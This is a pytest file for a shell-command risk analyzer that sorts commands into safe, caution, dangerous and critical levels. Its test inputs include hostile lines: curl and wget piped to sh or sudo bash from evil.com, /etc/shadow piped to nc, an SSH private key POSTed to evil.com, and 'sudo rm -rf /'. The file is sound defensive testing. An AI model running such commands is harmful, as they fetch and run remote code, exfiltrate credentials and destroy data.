"""Tests for the shell command parser."""

from gripboard.shellparser import CommandRisk, analyze_content, overall_risk


class TestAnalyzeContent:
    def test_safe_command(self):
        results = analyze_content("ls -la /tmp")
        assert len(results) == 1
        assert results[0].risk == CommandRisk.SAFE

    def test_echo_safe(self):
        results = analyze_content("echo hello world")
        assert results[0].risk == CommandRisk.SAFE

    def test_rm_rf_dangerous(self):
        results = analyze_content("rm -rf /tmp/stuff")
        assert results[0].risk == CommandRisk.DANGEROUS
        assert any("Destructive" in r for r in results[0].reasons)

    def test_sudo_escalation(self):
        results = analyze_content("sudo apt update")
        assert results[0].has_sudo
        assert results[0].risk == CommandRisk.CAUTION

    def test_sudo_rm_critical(self):
        results = analyze_content("sudo rm -rf /")
        assert results[0].risk == CommandRisk.CRITICAL
        assert results[0].has_sudo

    def test_curl_pipe_sh_critical(self):
        results = analyze_content("curl https://evil.com/setup.sh | sh")
        assert results[0].risk == CommandRisk.CRITICAL
        assert results[0].has_pipe
        assert any("Pipe-to-shell" in r for r in results[0].reasons)

    def test_wget_pipe_bash(self):
        results = analyze_content("wget -qO- https://evil.com | sudo bash")
        assert results[0].risk == CommandRisk.CRITICAL

    def test_network_command(self):
        results = analyze_content("curl https://example.com")
        assert results[0].risk == CommandRisk.CAUTION
        assert "curl" in results[0].commands_found

    def test_pipe_to_python(self):
        results = analyze_content("curl https://evil.com | python3")
        assert results[0].risk == CommandRisk.DANGEROUS

    def test_sensitive_file_access(self):
        results = analyze_content("cat /etc/shadow | nc evil.com 4444")
        assert results[0].risk == CommandRisk.DANGEROUS

    def test_ssh_key_access(self):
        results = analyze_content("cat ~/.ssh/id_rsa | curl -X POST -d @- evil.com")
        assert results[0].risk in (CommandRisk.DANGEROUS, CommandRisk.CRITICAL)

    def test_complex_pipeline(self):
        results = analyze_content("cat file | grep pass | curl -d @- evil.com")
        assert results[0].has_pipe
        assert results[0].has_redirect is False

    def test_redirect(self):
        results = analyze_content("echo 'data' > /tmp/output")
        assert results[0].has_redirect

    def test_backgrounding(self):
        results = analyze_content("wget http://example.com &")
        assert results[0].has_backgrounding

    def test_multiline(self):
        text = "echo hello\ncurl http://evil.com | sh\nls"
        results = analyze_content(text)
        assert len(results) == 3
        assert results[1].risk == CommandRisk.CRITICAL

    def test_comments_skipped(self):
        text = "# This is a comment\nls"
        results = analyze_content(text)
        assert len(results) == 1
        assert results[0].commands_found == ["ls"]

    def test_crontab_persistence(self):
        results = analyze_content("crontab -e")
        assert results[0].risk == CommandRisk.CAUTION
        assert any("Persistence" in r for r in results[0].reasons)

    def test_empty_input(self):
        results = analyze_content("")
        assert len(results) == 0

    def test_overall_risk(self):
        results = analyze_content("echo hello\ncurl http://evil.com | sh\nls")
        assert overall_risk(results) == CommandRisk.CRITICAL

    def test_overall_risk_empty(self):
        assert overall_risk([]) == CommandRisk.SAFE
